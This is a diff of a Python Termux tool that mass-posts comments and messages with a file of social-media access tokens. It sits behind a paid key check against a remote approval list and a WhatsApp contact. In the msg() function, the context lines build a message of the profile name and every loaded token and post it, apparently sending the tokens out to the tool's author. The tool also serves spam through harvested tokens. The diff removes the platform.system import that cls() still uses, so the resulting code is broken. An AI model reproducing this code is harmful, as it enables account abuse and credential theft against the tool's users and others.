@@ -1,48 +1,10 @@
-import requests
-import json
-import time
-import sys
-from platform import system
-import random
 import os
-try:
-    import requests
-except ImportError:
-    print('\n [✓] installing requests !...\n')
-    os.system('pip install requests')
-
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n [✓] installing futures !...\n')
-    os.system('pip install futures')
-
-try:
-    import bs4
-except ImportError:
-    print('\n [✓] installing bs4 !...\n')
-    os.system('pip install bs4')
-
-import requests, os, re, bs4, platform, sys, json, time, random, datetime, subprocess, threading, itertools, base64, uuid, zlib
-from concurrent.futures import ThreadPoolExecutor as sarfrazssb
-from datetime import datetime
-from bs4 import BeautifulSoup
-
-# Import additional functions
+import requests
+import random
+import time
 from gtts import gTTS
+from concurrent.futures import ThreadPoolExecutor
 
-os.system('clear')
-print("\033[1;37;40m")
-logo = ("""\033[97;1m
-
-
-
-\033[1;37;96m ANAND MEHRA ON FIRE 
-
-\033[1;37;96m""")
-print(logo)
-
-# Additional functions for creating and playing audio
 def create_audio(text, file):
     try:
         my_audio = gTTS(text)
@@ -60,7 +22,12 @@ def play_audio(audio_file):
 def main_apv():
     os.system('clear')
     ak = "M3HR9-D3V1L"
+    print("\033[1;37;40m")
+    logo = ("""\033[97;1m
+    \033[1;37;96m ANAND MEHRA ON FIRE 
+    \033[1;37;96m""")
     print(logo)
+    
     try:
         key1 = open('/data/data/com.termux/files/home/bin/Anand-xd', 'r').read()
     except IOError:
@@ -84,6 +51,7 @@ def main_apv():
         print("[*]_______________________")
         time.sleep(6)
         os.system("xdg-open https://wa.me/+917643890954")
+    
     r1 = requests.get("https://raw.githubusercontent.com/aaanandsir/MEHRA_KING/main/Aproval.txt").text
     if key1 in r1:
         create_audio("Welcome to Anand Mehra tool", "welcome.mp3")
@@ -102,23 +70,19 @@ def main_apv():
         print("     Copy Key And Sent Me WP Approvel Your Key ")
         print("[*]_______________________")
         time.sleep(3.5)
-        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20' + "" + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + "" + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + ak + key1
-
+        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20' + "" + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + "" + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + ak + key1
+    
         os.system('am start https://wa.me/+917643890954?text=' + tks)
 
-os.system('clear')
-print(logo)
 def post_comments():
-
     access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
 
     with open(access_tokens_file, 'r') as token_file:
         access_tokens = [token.strip() for token in token_file.readlines()]
 
     num_tokens = len(access_tokens)
-
     requests.packages.urllib3.disable_warnings()
-
+    
     def cls():
         if system() == 'Linux':
             os.system('clear')
@@ -216,6 +180,17 @@ def msg():
     with open(access_tokens_file, 'r') as token_file:
         access_tokens = [token.strip() for token in token_file.readlines()]
 
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
     parameters = {
         'access_token': random.choice(access_tokens),
         'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
@@ -232,3 +207,4 @@ def main():
 
 if __name__ == '__main__':
     main_apv()
+    
